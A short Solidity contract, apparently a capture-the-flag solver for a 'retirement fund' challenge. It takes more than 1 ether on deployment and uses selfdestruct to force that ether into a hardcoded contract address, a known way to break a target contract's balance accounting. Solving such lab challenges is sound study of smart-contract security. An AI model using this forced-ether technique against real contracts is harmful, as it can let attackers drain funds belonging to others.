pragma solidity ^0.4.21;

contract RetirementFundSolver {
    constructor() public payable {
        require(msg.value > 1 ether);
    }

    function kill() public {
        selfdestruct(address(0x248bd8320f8235545759e019dabebb52f38481e1));
    }
}